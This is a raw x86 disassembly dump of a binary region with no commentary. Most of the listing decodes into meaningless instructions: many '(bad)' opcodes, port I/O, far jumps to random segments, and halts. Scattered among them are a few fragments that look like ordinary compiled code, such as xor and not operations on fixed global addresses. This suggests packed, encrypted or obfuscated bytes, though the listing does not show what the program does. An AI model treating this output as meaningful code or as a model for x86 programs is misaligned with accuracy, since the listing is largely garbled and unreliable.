  4130e7:	lds    edi,FWORD PTR [edi+edi*2+0x19]
  4130eb:	push   ebp
  4130ec:	ror    BYTE PTR [ecx-0x4b],1
  4130ef:	xchg   BYTE PTR [edx-0x292be4aa],ah
  4130f5:	scas   al,BYTE PTR es:[edi]
  4130f6:	stos   DWORD PTR es:[edi],eax
  4130f7:	xor    al,0x35
  4130f9:	shr    cl,cl
  4130fb:	dec    edi
  4130fc:	pop    esp
  4130fd:	mov    edx,0x30ae2e52
  413102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413103:	cmp    al,0x83
  413105:	xor    DWORD PTR [ebx],ecx
  413107:	jne    0x413119
  413109:	jo     0x41317d
  41310b:	sahf   
  41310c:	(bad)  
  41310d:	hlt    
  41310e:	add    DWORD PTR [esi-0x6a],esp
  413111:	or     al,0x96
  413113:	mov    edi,DWORD PTR [edx]
  413115:	jmp    0xbca1c2ea
  41311a:	or     BYTE PTR [edi-0x35d25d6b],0x8
  413121:	repz das 
  413123:	or     al,0xd9
  413125:	mov    ah,0xba
  413127:	jp     0x4130e4
  413129:	adc    dl,BYTE PTR [esi-0x576e1140]
  41312f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413130:	xchg   dh,ch
  413132:	stos   BYTE PTR es:[edi],al
  413133:	xchg   ebx,eax
  413134:	add    BYTE PTR [edx],0x9a
  413137:	mov    edx,0xc5883c12
  41313c:	ret    
  41313d:	mov    DWORD PTR [edi+0x40010764],esp
  413143:	dec    esp
  413144:	mov    eax,ds:0x8923012d
  413149:	jne    0x413123
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fc79
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e0a8,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	lahf   
  41317f:	xlat   BYTE PTR ds:[ebx]
  413180:	das    
  413181:	xor    esp,DWORD PTR [ebx-0x468f8f9f]
  413187:	jle    0x4131f9
  413189:	jo     0x413116
  41318b:	test   BYTE PTR [eax*8+0x220ed80d],dh
  413192:	fdivrp st(5),st
  413194:	sub    ch,BYTE PTR [eax+0x10]
  413197:	not    cl
  413199:	sbb    esp,edi
  41319b:	dec    esi
  41319c:	xchg   BYTE PTR [ecx-0x3d052388],dl
  4131a2:	cmp    al,0x98
  4131a4:	lods   eax,DWORD PTR ds:[esi]
  4131a5:	jno    0x413142
  4131a7:	inc    eax
  4131a8:	xchg   esi,eax
  4131a9:	sbb    DWORD PTR [eax+0x3177be50],0xffffffb7
  4131b0:	mov    cs,WORD PTR [ebx+0x37]
  4131b3:	cmp    BYTE PTR [eax-0x56e9d204],dl
  4131b9:	push   ecx
  4131ba:	adc    ch,BYTE PTR [esp+ebp*8]
  4131bd:	jnp    0x413178
  4131bf:	mov    bh,0x2e
  4131c1:	xchg   ebp,eax
  4131c2:	(bad)  
  4131c4:	pop    eax
  4131c5:	lds    esp,FWORD PTR [edi-0x9b5fe23]
  4131cb:	loope  0x4131d2
  4131cd:	mov    esp,0x4651b18f
  4131d2:	repnz mov al,ds:0xdcd11589
  4131d8:	dec    ebx
  4131d9:	imul   DWORD PTR [edi+0x2f]
  4131dc:	push   esp
  4131dd:	sti    
  4131de:	loopne 0x41321a
  4131e0:	add    BYTE PTR [esp+edi*1-0x73],dh
  4131e4:	mov    ebp,0x78c5eca7
  4131e9:	mov    edx,0x2322705a
  4131ee:	pop    esp
  4131ef:	dec    eax
  4131f0:	es adc al,0xc7
  4131f3:	(bad)  
  4131f4:	jmp    0x413197
  4131f6:	xchg   edx,eax
  4131f7:	or     ebx,DWORD PTR [esi+ecx*8]
  4131fa:	inc    eax
  4131fb:	mov    ah,0x8d
  4131fd:	punpckhdq mm1,QWORD PTR [edx-0x2f4a183b]
  413204:	test   al,ah
  413206:	loope  0x413266
  413208:	ins    BYTE PTR es:[edi],dx
  413209:	xor    cl,BYTE PTR [ecx+0x2f]
  41320c:	xor    BYTE PTR [ecx+ebx*8+0x3fabc474],bh
  413213:	mov    cs,WORD PTR [esi]
  413215:	or     eax,0xa1f2491f
  41321a:	ins    DWORD PTR es:[edi],dx
  41321b:	retf   
  41321c:	pop    esi
  41321d:	ss out 0xc5,al
  413220:	mul    DWORD PTR [esi-0x49e0435]
  413226:	in     eax,0x1f
  413228:	(bad)  
  413229:	loop   0x41322d
  41322b:	adc    edi,ecx
  41322d:	aas    
  41322e:	sub    ebx,ecx
  413230:	(bad)  [esi-0x32055eb7]
  413236:	das    
  413237:	ins    DWORD PTR es:[edi],dx
  413238:	jne    0x4132ac
  41323a:	cdq    
  41323b:	sub    eax,0xea19faff
  413240:	adc    BYTE PTR [ecx],ah
  413242:	xchg   esi,eax
  413243:	pop    edx
  413244:	nop
  413245:	dec    eax
  413246:	sbb    DWORD PTR [edi+ebx*1],esp
  413249:	dec    edi
  41324a:	pushf  
  41324b:	scas   al,BYTE PTR es:[edi]
  41324c:	sub    al,0x74
  41324e:	(bad)  
  41324f:	retf   
  413250:	jmp    edx
  413252:	xchg   ebp,eax
  413253:	out    dx,al
  413254:	imul   esi,ebp,0xffffffdd
  413257:	pusha  
  413258:	and    eax,0xbc4e5494
  41325d:	and    al,0xae
  41325f:	cdq    
  413260:	jno    0x413241
  413262:	or     DWORD PTR [edx+0x718825b5],ebp
  413268:	pop    ds
  413269:	or     eax,0x784750c8
  41326e:	js     0x4132b2
  413270:	fidiv  DWORD PTR [edx-0x50]
  413273:	xor    DWORD PTR [esi],edx
  413275:	stc    
  413276:	pop    esp
  413277:	shl    BYTE PTR [edx-0x13471a3],0x80
  41327e:	mov    esp,0x7e512f2d
  413283:	jp     0x4132c8
  413285:	inc    ecx
  413286:	push   ds
  413287:	or     dh,BYTE PTR [eax+0x38945495]
  41328d:	call   0xfabd839c
  413292:	lods   eax,DWORD PTR ds:[esi]
  413293:	sub    dh,ch
  413295:	push   cs
  413296:	fwait
  413297:	clc    
  413298:	out    dx,al
  413299:	cmp    ecx,edx
  41329b:	mov    dl,0x9a
  41329d:	add    DWORD PTR [ecx],ebp
  41329f:	fdiv   QWORD PTR [edi-0x41]
  4132a2:	sbb    ecx,edi
  4132a4:	arpl   WORD PTR [eax],bp
  4132a6:	sti    
  4132a7:	lock adc ebx,DWORD PTR [edx-0x1786e4e6]
  4132ae:	push   cs
  4132af:	jg     0x413316
  4132b1:	jno    0x413319
  4132b3:	jns    0x413239
  4132b5:	cwde   
  4132b6:	lds    edi,FWORD PTR [esi-0x76165dc4]
  4132bc:	fisttp WORD PTR [edi]
  4132be:	dec    eax
  4132bf:	lods   al,BYTE PTR ds:[esi]
  4132c0:	sbb    dh,BYTE PTR [esp+ebp*2]
  4132c3:	inc    esp
  4132c4:	xchg   cl,dh
  4132c6:	xchg   ebp,eax
  4132c7:	fidiv  WORD PTR [esi+0x25a520eb]
  4132cd:	sahf   
  4132ce:	xor    al,0x81
  4132d0:	dec    edx
  4132d1:	cmp    eax,0xa960218
  4132d6:	in     eax,dx
  4132d7:	ss out dx,eax
  4132d9:	xchg   ebx,eax
  4132da:	pop    ds
  4132db:	mov    ecx,0xe4dadb0a
  4132e0:	xchg   ecx,eax
  4132e1:	inc    edx
  4132e2:	scas   al,BYTE PTR es:[di]
  4132e4:	jmp    0x40f:0x433741b7
  4132eb:	scas   al,BYTE PTR es:[edi]
  4132ec:	mov    ebp,0x89087a81
  4132f1:	scas   eax,DWORD PTR es:[edi]
  4132f2:	loop   0x41333c
  4132f4:	xchg   esi,eax
  4132f5:	fstp   TBYTE PTR [edi-0x72]
  4132f8:	pushf  
  4132f9:	push   ebx
  4132fa:	out    0x47,al
  4132fc:	mov    dl,0x50
  4132fe:	mov    cl,0xe0
  413300:	out    0xb0,al
  413302:	sub    eax,0x3f2b3a46
  413307:	jne    0x413347
  413309:	mov    al,ds:0x15ebc7fd
  41330e:	or     al,BYTE PTR [ebx]
  413310:	pop    ebp
  413311:	stc    
  413312:	mov    bl,0xf6
  413314:	sbb    edx,ebp
  413316:	pop    esp
  413317:	in     al,0xd9
  413319:	mov    ds:0x4902704f,al
  41331e:	inc    BYTE PTR [ebp+0x2aa5382b]
  413324:	sbb    eax,0xf9862040
  413329:	popa   
  41332a:	sahf   
  41332b:	inc    esi
  41332c:	mov    edx,DWORD PTR ds:0x720121d1
  413332:	xor    DWORD PTR [esi-0x6b813715],0x80cd6f24
  41333c:	rcr    DWORD PTR [edx+0x5c],cl
  41333f:	cmp    DWORD PTR [esi],ecx
  413341:	xor    ah,BYTE PTR [esi+edx*4-0x13]
  413345:	push   esp
  413346:	bound  ebx,QWORD PTR [ebx+0x2dc67b61]
  41334c:	test   BYTE PTR ds:0x96eaab1e,bh
  413352:	mov    BYTE PTR [ebp-0x27],al
  413355:	ficom  DWORD PTR [bx+si]
  413358:	xchg   BYTE PTR [ecx+0x4f],bl
  41335b:	lods   al,BYTE PTR ds:[esi]
  41335c:	mov    ds,WORD PTR [ebx-0x50]
  41335f:	fiadd  DWORD PTR [eax+edx*8]
  413362:	jnp    0x413399
  413364:	mov    ah,0xf0
  413366:	add    BYTE PTR [ebx-0xfb14f06],ch
  41336c:	dec    esi
  41336d:	add    ah,0x37
  413370:	sahf   
  413371:	and    BYTE PTR ds:[ebp-0x27],0x0
  413376:	pop    edi
  413377:	fisubr WORD PTR [edx-0x61]
  41337a:	push   ebp
  41337b:	outs   dx,DWORD PTR ds:[esi]
  41337c:	or     al,0x2f
  41337e:	mov    dl,0x99
  413380:	mov    ?,WORD PTR [ecx]
  413382:	aas    
  413383:	loope  0x413326
  413385:	test   eax,0x78297d8d
  41338a:	xchg   DWORD PTR [ebx-0x6d2901ae],ebx
  413390:	inc    ebp
  413391:	inc    eax
  413392:	out    dx,eax
  413393:	fldenv [ebp+0x37]
  413396:	mov    BYTE PTR [esi+ecx*2-0x30],bl
  41339a:	shl    BYTE PTR [esi],cl
  41339c:	repnz ficomp WORD PTR [edx+edx*4+0x1d]
  4133a1:	or     DWORD PTR [edx],edi
  4133a3:	call   FWORD PTR [eax-0x3572ba1b]
  4133a9:	push   es
  4133aa:	dec    edx
  4133ab:	stos   DWORD PTR es:[edi],eax
  4133ac:	jo     0x41338f
  4133ae:	dec    ecx
  4133af:	mov    dl,0x9f
  4133b1:	mov    dl,0x30
  4133b3:	or     BYTE PTR [ecx],al
  4133b5:	push   ebp
  4133b6:	pop    edi
  4133b7:	mov    ds:0x5a33b426,eax
  4133bc:	retf   
  4133bd:	in     al,dx
  4133be:	arpl   WORD PTR [ecx-0x65],si
  4133c1:	in     eax,dx
  4133c2:	fist   WORD PTR [edx-0x2481faab]
  4133c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133c9:	push   ss
  4133ca:	in     ax,0x5d
  4133cd:	mov    eax,ds:0xca9619f8
  4133d2:	or     eax,0xe61156f9
  4133d7:	jge    0x4133bf
  4133d9:	cmp    al,0x21
  4133db:	sar    DWORD PTR ds:0x7af1d6d8,cl
  4133e1:	loope  0x4133c4
  4133e3:	xor    al,0x16
  4133e5:	jo     0x413439
  4133e7:	dec    edx
  4133e8:	test   ah,bl
  4133ea:	and    ebp,DWORD PTR [esi-0x79f4020b]
  4133f0:	pop    ds
  4133f1:	cmp    cl,BYTE PTR [eax]
  4133f3:	dec    eax
  4133f4:	fidivr WORD PTR [edi-0x1]
  4133f7:	or     DWORD PTR [ebx+0x72],0x6dadc078
  4133fe:	dec    esp
  4133ff:	jge    0x413383
  413401:	shr    BYTE PTR [edx+0x5e],cl
  413404:	xchg   BYTE PTR [edi+0x7c480818],cl
  41340a:	sbb    edi,esi
  41340c:	jmp    0x413463
  41340e:	shr    DWORD PTR [edx],cl
  413410:	mov    esi,0x6c6f39b5
  413415:	das    
  413416:	stc    
  413417:	stos   DWORD PTR es:[edi],eax
  413418:	push   edx
  413419:	cmp    BYTE PTR fs:[eax-0x6c],0x44
  41341e:	inc    ebx
  41341f:	pop    ds
  413420:	js     0x41344d
  413422:	pop    ebp
  413423:	lock xor edi,DWORD PTR [ecx]
  413426:	aas    
  413427:	adc    DWORD PTR [edx+0x4adbc0d9],ebx
  41342d:	popa   
  41342e:	or     eax,0xec1ddd28
  413433:	cmp    al,0xde
  413435:	inc    edi
  413436:	sbb    bl,ah
  413438:	loope  0x41346a
  41343a:	mov    ecx,0x77bf02e0
  41343f:	out    dx,al
  413440:	xchg   ecx,eax
  413441:	(bad)  
  413442:	ror    DWORD PTR [esi+0x645f9969],0xc1
  413449:	jne    0x413425
  41344b:	in     al,dx
  41344c:	inc    esi
  41344d:	test   BYTE PTR [ebp-0x34fc2f24],al
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fc79
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fc55,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x184eb80f,al
  413492:	std    
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x8970707e
  41349c:	add    cl,BYTE PTR [esi-0x159c6b39]
  4134a2:	add    DWORD PTR [ecx-0x461447a2],eax
  4134a8:	push   ebx
  4134a9:	jmp    0x2917792e
  4134ae:	repz cmc 
  4134b0:	outs   dx,DWORD PTR ds:[esi]
  4134b1:	xchg   DWORD PTR [eax],edi
  4134b3:	or     DWORD PTR [ebp-0x56],edi
  4134b6:	pop    ebp
  4134b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134b8:	scas   eax,DWORD PTR es:[edi]
  4134b9:	pop    esi
  4134ba:	adc    eax,0xeb0f5181
  4134bf:	cwde   
  4134c0:	dec    edi
  4134c1:	fcmovne st,st(5)
  4134c3:	popf   
  4134c4:	or     eax,ebp
  4134c6:	std    
  4134c7:	sub    ecx,DWORD PTR [esi+0x1c]
  4134ca:	sub    DWORD PTR [ebx-0x4c511390],ecx
  4134d0:	mov    ebp,DWORD PTR [esp+ebp*1-0x57]
  4134d4:	adc    edx,DWORD PTR [eax+0x64]
  4134d7:	mov    dh,0x59
  4134d9:	jmp    0x4134e0
  4134db:	inc    ecx
  4134dc:	xchg   DWORD PTR [edx-0x20],eax
  4134df:	mov    fs,WORD PTR [edi+0x50a11347]
  4134e5:	sbb    dh,0x24
  4134e8:	ret    0x18ba
  4134eb:	xor    bl,BYTE PTR [edx]
  4134ed:	mov    ah,0xba
  4134ef:	sbb    BYTE PTR ds:0x9d87c4d,al
  4134f5:	push   esp
  4134f6:	pop    edi
  4134f7:	lahf   
  4134f8:	pop    esi
  4134f9:	inc    eax
  4134fa:	scas   al,BYTE PTR es:[edi]
  4134fb:	pop    DWORD PTR [ebx]
  4134fd:	pushf  
  4134fe:	inc    eax
  4134ff:	leave  
  413500:	mov    ebp,ebp
  413502:	or     al,0xab
  413504:	dec    edi
  413505:	add    BYTE PTR [ecx+0x5],ah
  413508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413509:	cmp    eax,0x5aa6aa7f
  41350e:	retf   
  41350f:	ins    BYTE PTR es:[edi],dx
  413510:	imul   eax,DWORD PTR [eax-0x63],0xbbe16fed
  413517:	jbe    0x413503
  413519:	lods   al,BYTE PTR ds:[esi]
  41351a:	cmp    ebx,DWORD PTR [ecx]
  41351c:	fld    QWORD PTR [edi+0x6a9ca46]
  413522:	mov    al,ss:0x62dc8c8b
  413528:	push   ecx
  413529:	xor    dl,bl
  41352b:	mov    esp,0x6bac3c70
  413530:	push   eax
  413531:	jle    0x413551
  413533:	lea    esp,[ecx+0x57]
  413536:	mov    cl,0xbe
  413538:	cmp    DWORD PTR ss:[edi+0x3f],ebx
  41353c:	jbe    0x413507
  41353e:	jmp    0xa722:0x1668d576
  413545:	arpl   WORD PTR [edx],dx
  413547:	dec    edx
  413548:	xchg   BYTE PTR [ebp+0x7a],ch
  41354b:	cld    
  41354c:	icebp  
  41354d:	in     eax,0xe5
  41354f:	dec    ebx
  413550:	in     al,0x3
  413552:	jae    0x4135af
  413554:	mov    al,ds:0xcbbf182b
  413559:	pop    esp
  41355a:	mov    ss:0xddd85ab8,al
  413560:	mov    dh,BYTE PTR [eax+edi*2]
  413563:	adc    eax,0x2a133a1
  413568:	push   esi
  413569:	int3   
  41356a:	cwde   
  41356b:	or     al,0xfc
  41356d:	aad    0xc8
  41356f:	sub    eax,0xafe7b899
  413574:	icebp  
  413575:	test   eax,0x8e690bff
  41357a:	imul   ebx,DWORD PTR [eax+edi*2],0x1987129d
  413581:	push   ebx
  413582:	pop    ecx
  413583:	jp     0x413590
  413585:	mov    ds:0xbe3a276,eax
  41358a:	ficom  DWORD PTR [ebx]
  41358c:	mov    ds:0x24d25c61,al
  413591:	dec    edx
  413592:	dec    edi
  413593:	data16 jbe 0x4135e9
  413596:	inc    ecx
  413597:	scas   al,BYTE PTR es:[edi]
  413598:	je     0x413552
  41359a:	scas   eax,DWORD PTR es:[edi]
  41359b:	lods   al,BYTE PTR ds:[esi]
  41359c:	sar    ch,1
  41359e:	js     0x4135a7
  4135a0:	popa   
  4135a1:	arpl   bp,di
  4135a3:	mov    dh,0xa8
  4135a5:	sub    eax,DWORD PTR [edi+0x15]
  4135a8:	out    dx,al
  4135a9:	arpl   WORD PTR [eax-0xb],bp
  4135ac:	push   esp
  4135ad:	sub    cl,bl
  4135af:	or     eax,0x92434a3e
  4135b4:	dec    ebp
  4135b5:	push   edx
  4135b6:	jp     0x41354b
  4135b8:	adc    BYTE PTR [edi+0x3d],dh
  4135bb:	cli    
  4135bc:	push   esi
  4135bd:	jb     0x413636
  4135bf:	popf   
  4135c0:	mov    dl,0x10
  4135c2:	push   0xffffff81
  4135c4:	mov    fs,WORD PTR [edx-0xe]
  4135c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135c8:	shr    al,1
  4135ca:	mov    eax,0x576179b8
  4135cf:	sbb    al,0x6c
  4135d1:	and    ebp,DWORD PTR [ecx+0x6160aa]
  4135d7:	xor    al,0x68
  4135d9:	sbb    edx,ebx
  4135db:	fwait
  4135dc:	lea    ecx,[eax+0x5ec7d117]
  4135e2:	bound  ebx,QWORD PTR [eax-0x4785b88d]
  4135e8:	mov    ah,0x89
  4135ea:	mov    dl,0xc4
  4135ec:	sub    DWORD PTR [ecx-0xa8c6ba0],esp
  4135f2:	xchg   DWORD PTR [edi+0x4c4259ce],ebp
  4135f8:	test   DWORD PTR ds:0xbc1415c8,ebx
  4135fe:	fwait
  4135ff:	popa   
  413600:	cld    
  413601:	xor    eax,0xa34203db
  413606:	fwait
  413607:	push   edi
  413608:	(bad)  
  413609:	pushf  
  41360a:	lds    ecx,FWORD PTR [ebx-0x7d5e0ef9]
  413610:	test   al,0xba
  413612:	imul   eax,DWORD PTR [eax],0x30
  413615:	iret   
  413616:	add    edi,ebx
  413618:	push   ss
  413619:	inc    ecx
  41361a:	jmp    0x8785:0xade35df6
  413621:	jl     0x41366c
  413623:	cwde   
  413624:	dec    ebp
  413625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413626:	lds    esi,FWORD PTR [ecx+0x14]
  413629:	int    0x89
  41362b:	inc    esp
  41362c:	loop   0x41360b
  41362e:	lahf   
  41362f:	in     al,dx
  413630:	or     al,0xab
  413632:	add    esi,eax
  413634:	div    DWORD PTR [ebx+0xd46bbd2]
  41363a:	out    dx,eax
  41363b:	cmp    BYTE PTR [esi+0x3be345db],0x54
  413642:	add    edx,DWORD PTR [ebx+0x10]
  413645:	and    DWORD PTR [edx],0x7c5ab41b
  41364b:	or     eax,0x4b33c905
  413650:	lds    edx,FWORD PTR cs:[edx]
  413653:	push   edx
  413654:	jne    0x413664
  413656:	ds xchg ecx,eax
  413658:	lods   eax,DWORD PTR ds:[esi]
  413659:	pop    ebx
  41365a:	jmp    0x41365c
  41365c:	jmp    0x2d351955
  413661:	cmp    ebx,esp
  413663:	cmp    eax,0xe8346a2a
  413668:	cld    
  413669:	dec    ecx
  41366a:	addr16 and bh,dh
  41366d:	mov    dl,0xbc
  41366f:	loop   0x413633
  413671:	mov    al,ds:0xed002bfd
  413676:	and    BYTE PTR [ebp+ebx*4-0x1c],bl
  41367a:	aas    
  41367b:	aas    
  41367c:	jnp    0x413604
  41367e:	add    esp,DWORD PTR [ebx]
  413680:	xlat   BYTE PTR ds:[ebx]
  413681:	sub    cl,al
  413683:	test   eax,0xf89a55dc
  413688:	cmc    
  413689:	jae    0x4136dc
  41368b:	int3   
  41368c:	pop    ss
  41368d:	loope  0x413699
  41368f:	imul   edx
  413691:	mov    ebx,0xb8354c78
  413696:	xchg   ecx,eax
  413697:	test   DWORD PTR ds:0x96a098e4,edi
  41369d:	jmp    0xd9a7:0xc5ace920
  4136a4:	dec    ecx
  4136a5:	stos   BYTE PTR es:[edi],al
  4136a6:	cmp    eax,0x7beeb6be
  4136ab:	or     eax,0x2f16ab63
  4136b0:	mov    fs,WORD PTR [edi+0x5b45bde3]
  4136b6:	push   esp
  4136b7:	mov    edi,DWORD PTR [ecx]
  4136b9:	xchg   esi,eax
  4136ba:	stos   BYTE PTR es:[edi],al
  4136bb:	cmp    eax,0xf80f70b
  4136c0:	sbb    DWORD PTR es:[ebx+0x3903111f],esi
  4136c7:	xchg   cl,ch
  4136c9:	pop    ecx
  4136ca:	add    al,0x75
  4136cc:	jle    0x4136ab
  4136ce:	adc    eax,0x9e7868e6
  4136d3:	popa   
  4136d4:	rcl    BYTE PTR [ebx+0x5a6a7ca2],cl
  4136da:	xchg   ebx,eax
  4136db:	ds call 0x9f9:0xde016cc5
  4136e3:	aaa    
  4136e4:	aas    
  4136e5:	je     0xee6711c
  4136eb:	pop    ecx
  4136ec:	mov    bh,0x20
  4136ee:	cmp    ebx,esp
  4136f0:	xor    DWORD PTR [ecx-0x4b],ebx
  4136f3:	in     eax,0xbc
  4136f5:	sahf   
  4136f6:	neg    DWORD PTR [ebx-0x3e]
  4136f9:	push   es
  4136fa:	lea    ebx,[ecx-0x1cc46869]
  413700:	sbb    BYTE PTR [edi-0x693ce6f2],ch
  413706:	aad    0x65
  413708:	pop    ebx
  413709:	mov    ecx,0x8a5316ad
  41370e:	mov    ch,0x8
  413710:	jg     0x41378e
  413712:	aas    
  413713:	pop    ebp
  413714:	jbe    0x41376a
  413716:	sub    bh,bl
  413718:	cmp    bh,bl
  41371a:	(bad)  
  41371c:	xchg   ebp,eax
  41371d:	out    dx,eax
  41371e:	std    
  41371f:	gs jl  0x4136c3
  413722:	loope  0x41377c
  413724:	fbld   TBYTE PTR [ebp-0x3910b2c4]
  41372a:	push   cs
  41372b:	pusha  
  41372c:	or     ebx,DWORD PTR gs:[eax]
  41372f:	retf   
  413730:	or     eax,0x2c6731ec
  413735:	jl     0x413782
  413737:	cmp    dl,BYTE PTR [edx-0x48]
  41373a:	cwde   
  41373b:	pop    esi
  41373c:	adc    eax,0xbab98505
  413741:	mov    BYTE PTR ds:0xc2452b6b,dl
  413747:	in     eax,0x20
  413749:	in     eax,0x65
  41374b:	push   ecx
  41374c:	in     al,dx
  41374d:	sbb    DWORD PTR [edx-0x61],0xffffff97
  413751:	js     0x4137b7
  413753:	lock div BYTE PTR [ecx+0x3b]
  413757:	retf   0xe234
  41375a:	or     DWORD PTR [edx-0x9],eax
  41375d:	scas   al,BYTE PTR es:[edi]
  41375e:	popf   
  41375f:	push   ds
  413760:	in     eax,0x2f
  413762:	cmp    edi,eax
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	mov    ebp,edi
  413780:	pop    eax
  413781:	lock xor eax,0xb970706b
  413787:	jle    0x4137f9
  413789:	jo     0x413790
  41378b:	or     DWORD PTR [eax-0x2f70e8a9],edx
  413791:	fucomi st,st(6)
  413793:	mov    edi,0xd6a1a654
  413798:	pop    eax
  413799:	loop   0x41379b
  41379b:	repz push 0x60
  41379e:	hlt    
  41379f:	ret    0x71c9
  4137a2:	mov    eax,ds:0xd9a0a124
  4137a7:	sar    BYTE PTR [edi-0x5c8c4c51],0xf0
  4137ae:	out    dx,eax
  4137af:	js     0x413816
  4137b1:	jge    0x4137de
  4137b3:	adc    al,0xb1
  4137b5:	(bad)  
  4137b6:	rcl    DWORD PTR [ebp+0x5d],cl
  4137b9:	adc    edi,DWORD PTR [eax-0x35]
  4137bc:	sbb    BYTE PTR [ebp+0x4c],0xda
  4137c0:	push   esp
  4137c1:	shl    ebx,cl
  4137c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137c4:	lahf   
  4137c5:	mov    al,BYTE PTR [ebp+0x6bc080a0]
  4137cb:	jge    0x413752
  4137cd:	cdq    
  4137ce:	jo     0x413759
  4137d0:	inc    ecx
  4137d1:	(bad)  
  4137d2:	in     eax,dx
  4137d3:	jbe    0x4137ac
  4137d5:	xor    BYTE PTR [esi+0x70a430ec],ah
  4137db:	scas   al,BYTE PTR es:[edi]
  4137dc:	push   ss
  4137dd:	repnz dec sp
  4137e0:	jmp    0x4137c8
  4137e2:	loopne 0x413831
  4137e4:	lock (bad) 
  4137e6:	shl    BYTE PTR [ecx-0x206a63a0],cl
  4137ec:	xor    BYTE PTR [eax+0x36],ch
  4137ef:	mov    ebp,0x778aac7
  4137f4:	cmp    edx,DWORD PTR [edx]
  4137f6:	sbb    ah,cl
  4137f8:	fbstp  TBYTE PTR [esi-0x3]
  4137fb:	sbb    ch,bh
  4137fd:	repnz inc edx
  4137ff:	xchg   BYTE PTR [esi],ch
  413801:	mov    dh,0xf6
  413803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413804:	loopne 0x413862
  413806:	cs ins BYTE PTR es:[edi],dx
  413808:	bound  eax,QWORD PTR [ebp-0x1f]
  41380b:	push   eax
  41380c:	adc    al,0xaa
  41380e:	push   edx
  41380f:	ins    BYTE PTR es:[edi],dx
  413810:	mov    edi,ecx
  413812:	iret   
  413813:	(bad)  
  413814:	fwait
  413815:	int    0xcc
  413817:	mov    eax,ds:0x9ed3bc9b
  41381c:	push   edx
  41381d:	add    ch,dh
  41381f:	pushf  
  413820:	sahf   
  413821:	nop
  413822:	cdq    
  413823:	fwait
  413824:	push   0x62
  413826:	aas    
  413827:	lock jmp 0x41381a
  41382a:	and    DWORD PTR [ebx-0x258791b8],ebp
  413830:	mov    al,ds:0x393bddd4
  413835:	test   al,0xb7
  413837:	cmp    dh,bl
  413839:	jmp    0x6ce7:0x17683f25
  413840:	sbb    DWORD PTR [ebp+0x43],esi
  413843:	xchg   DWORD PTR ds:0x8e3973fe,edi
  413849:	mov    ah,0x59
  41384b:	pop    ecx
  41384c:	mov    esi,0xb98c2e0a
  413851:	outs   dx,DWORD PTR ds:[esi]
  413852:	push   cs
  413853:	sbb    BYTE PTR [edi-0x438b2129],bh
  413859:	(bad)  
  41385a:	mov    ecx,0x439b9154
  41385f:	aad    0x1a
  413861:	and    DWORD PTR [ebp+0xdf75b42],eax
  413867:	add    ch,0x60
  41386a:	inc    edi
  41386b:	loope  0x4138a9
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	sbb    DWORD PTR [esi+0x52],eax
  413871:	inc    edi
  413872:	rcr    DWORD PTR [ebp+0x5f],1
  413875:	cs (bad) 
  413877:	js     0x413872
  413879:	nop
  41387a:	mov    esi,0x52d7986c
  41387f:	mov    al,ds:0xe0fd0116
  413884:	shr    DWORD PTR [ecx],1
  413886:	repz and ah,BYTE PTR [esi+edx*1-0x3ea1c93d]
  41388e:	call   0xa38:0xa1cdbfa1
  413895:	inc    edx
  413896:	pop    esp
  413897:	leave  
  413898:	mov    ch,0xb5
  41389a:	retf   0xbc24
  41389d:	cdq    
  41389e:	int    0x93
  4138a0:	lds    esi,FWORD PTR [edi-0x2f6f9c40]
  4138a6:	(bad)  [ecx-0x1a]
  4138a9:	jecxz  0x4138f4
  4138ab:	fimul  WORD PTR [eax+0x32d0ebc6]
  4138b1:	xlat   BYTE PTR ds:[ebx]
  4138b2:	push   esi
  4138b3:	jno    0x413873
  4138b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138b6:	dec    esi
  4138b7:	add    BYTE PTR [ebx],0x79
  4138ba:	outs   dx,DWORD PTR ds:[esi]
  4138bb:	mov    ebp,0x250bdc7f
  4138c0:	shl    BYTE PTR [edx-0x3f],1
  4138c3:	fisttp DWORD PTR [ecx+0x7f96640a]
  4138c9:	gs jmp 0x8dc7107a
  4138cf:	je     0x4138d8
  4138d1:	lds    esp,FWORD PTR [ecx+0x223c1cfc]
  4138d7:	adc    eax,ebp
  4138d9:	std    
  4138da:	sti    
  4138db:	call   0x35485fd9
  4138e0:	sub    al,0xe5
  4138e2:	xchg   edi,eax
  4138e3:	dec    edi
  4138e4:	les    ebx,FWORD PTR [esi-0x38]
